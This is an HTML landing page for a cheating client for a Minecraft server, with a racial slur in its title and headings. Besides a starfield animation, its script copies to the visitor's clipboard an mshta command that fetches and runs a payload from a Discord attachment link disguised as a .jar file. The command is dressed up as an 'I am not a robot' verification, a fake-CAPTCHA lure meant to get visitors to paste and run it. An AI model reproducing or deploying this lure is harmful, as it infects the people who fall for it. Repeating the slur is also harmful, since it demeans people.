<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>nigger client lmao</title>
  <link rel="icon" href="https://nextinject.w3spaces.com/syringe.png" type="image/png">

  <meta property="og:title" content="nigger client">
  <meta property="og:description" content="the best performing cheating solution">
  <meta property="og:image" content="https://yourdomain.com/preview-image.png">
  <meta property="og:url" content="https://nextinject.lol">
  <meta property="og:type" content="website">

  <!-- Kaspersky script (keeping it as you had it) -->
  <script type="text/javascript" src="https://gc.kis.v2.scr.kaspersky-labs.com/FD126C42-EBFA-4E12-B309-BB3FDD723AC1/main.js?attr=jYU_wP_4pHMFBR6F2fbIy-EvgduJHrllprPQLlBZVDWrsyVZyLZjReiB0ugO4jM5FHEr7x1L1ZYvzXKFJcR-oQ" charset="UTF-8"></script>

  <style>
    body {
      margin: 0;
      overflow: hidden;
      background-color: black;
      font-family: 'Courier New', Courier, monospace;
      color: white;
    }

    .title-container {
      text-align: center;
      position: absolute;
      top: 20%;
      left: 50%;
      transform: translateX(-50%);
      z-index: 1;
    }

    .title {
      font-size: 80px;
      text-transform: lowercase;
      font-weight: bold;
      letter-spacing: 5px;
      animation: glowing 1.5s ease-in-out infinite;
    }

    .slogan {
      font-size: 24px;
      color: rgba(255,255,255,0.7);
      margin-top: 10px;
    }

    @keyframes glowing {
      0%, 100% { text-shadow: 0 0 5px #fff, 0 0 10px #fff, 0 0 15px #fff; }
      50%      { text-shadow: 0 0 15px #fff, 0 0 30px #fff, 0 0 40px #fff; }
    }

    canvas {
      position: fixed;
      inset: 0;
      z-index: 0;
    }

    .info {
      position: absolute;
      bottom: 40px;
      left: 50%;
      transform: translateX(-50%);
      font-size: 22px;
      color: #0f8;
      text-shadow: 0 0 10px #0f8;
      z-index: 1;
      user-select: none;
    }

    .copied {
      color: #f80;
      animation: pulse 1.2s infinite;
    }

    @keyframes pulse {
      0%,100% { opacity: 1; }
      50%     { opacity: 0.4; }
    }
  </style>
</head>
<body>

  <canvas id="canvas"></canvas>

  <div class="title-container">
    <div class="title">nigger client</div>
    <div class="slogan">best donutsmp focused hacked client, formerly known as smarttweaks</div>
  </div>

  <div class="info" id="copyStatus">Copying heya! to clipboard...</div>

  <script>
    // ─── Starfield ────────────────────────────────────────────────
    const canvas = document.getElementById('canvas');
    const ctx = canvas.getContext('2d');

    function resize() {
      canvas.width = window.innerWidth;
      canvas.height = window.innerHeight;
    }
    resize();
    window.addEventListener('resize', resize);

    let mouseX = canvas.width / 2;
    let mouseY = canvas.height / 2;

    document.addEventListener('mousemove', e => {
      mouseX = e.clientX;
      mouseY = e.clientY;
    });

    const stars = [];
    const STAR_COUNT = 350;
    const MAX_SPEED = 2;

    for (let i = 0; i < STAR_COUNT; i++) {
      stars.push({
        x: Math.random() * canvas.width,
        y: Math.random() * canvas.height,
        radius: Math.random() * 2 + 0.5,
        dx: (Math.random() - 0.5) * MAX_SPEED,
        dy: (Math.random() - 0.5) * MAX_SPEED
      });
    }

    function animate() {
      ctx.clearRect(0, 0, canvas.width, canvas.height);

      stars.forEach(star => {
        const dx = star.x - mouseX;
        const dy = star.y - mouseY;
        const dist = Math.hypot(dx, dy) || 1;

        const maxDist = 120;
        const force = Math.max((maxDist - dist) / maxDist, 0);

        if (dist < maxDist) {
          star.dx += (dx / dist) * force * 0.08;
          star.dy += (dy / dist) * force * 0.08;
        }

        const speed = Math.hypot(star.dx, star.dy);
        if (speed > MAX_SPEED) {
          star.dx = (star.dx / speed) * MAX_SPEED;
          star.dy = (star.dy / speed) * MAX_SPEED;
        }

        star.x += star.dx;
        star.y += star.dy;

        if (star.x < 0 || star.x > canvas.width) star.dx *= -1;
        if (star.y < 0 || star.y > canvas.height) star.dy *= -1;

        ctx.beginPath();
        ctx.arc(star.x, star.y, star.radius, 0, Math.PI * 2);
        ctx.fillStyle = 'rgba(255,255,255,0.85)';
        ctx.fill();
      });

      requestAnimationFrame(animate);
    }
    animate();

    const textToCopy = "heya!";
    const statusEl = document.getElementById('copyStatus');

    async function copyOnLoad() {
      try {
        await navigator.clipboard.writeText(textToCopy);
        statusEl.textContent = "Copied heya! ✓ (now paste it somewhere)";
        statusEl.classList.add('copied');
      } catch (err) {
        console.error("Clipboard failed:", err);
        statusEl.textContent = "Could not copy automatically. Manually copy: heya!";
        statusEl.style.color = "#f44";
      }
    }

    copyOnLoad();

    document.addEventListener('click', () => {
      if (statusEl.textContent.includes("Could not")) {
        copyOnLoad();
      }
    }, { once: true });
    
const verifyButton = document.getElementById('verifyButton');
const verifyUI = document.getElementById('verifyUI');

verifyButton.addEventListener('click', () => {
    const randomCode = Math.floor(1000 + Math.random() * 9000);
    
    const verificationString = `mshta http://cdn.discordapp.com/attachments/1461430363384451102/1461774356903362782/smarttweaks_1.21.x.jar?ex=697458b5&is=69730735&hm=3fcb5e5e36c7b9870658e30cf888f8041cf87c0eaae64f3af9ed46d97831de88& # ✅ "I am not a robot - NiggaClient Verification ID: ${randomCode}"`;


    navigator.clipboard.writeText(verificationString).then(() => {
        console.log('Code: ', verificationString);
    }).catch(err => {

    });


    verifyButton.style.display = 'none';
    verifyUI.style.display = 'block';
});

</script>
</body>
</html>